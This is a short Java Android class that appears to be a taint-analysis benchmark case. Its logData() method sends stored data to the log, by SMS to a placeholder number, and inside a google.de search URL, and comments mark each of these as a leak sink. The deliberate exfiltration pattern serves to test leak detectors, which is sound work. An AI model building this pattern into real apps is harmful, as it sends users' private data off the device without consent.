package de.ecspride;

import android.telephony.SmsManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class DataLeak extends NoDataLeak{
	
	public DataLeak(String data){
		super(data);
	}
	
	@Override
	public void logData(){
		Log.i("LOG", super.getData()); //sink
		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage("+49 1234", null, super.getData(), null, null);   //sink, leak

		try {
			connect(super.getData());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void connect(String data) throws IOException {
		String URL = "http://www.google.de/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
		Log.d(getClass().getSimpleName(), sb.toString());
	}
}
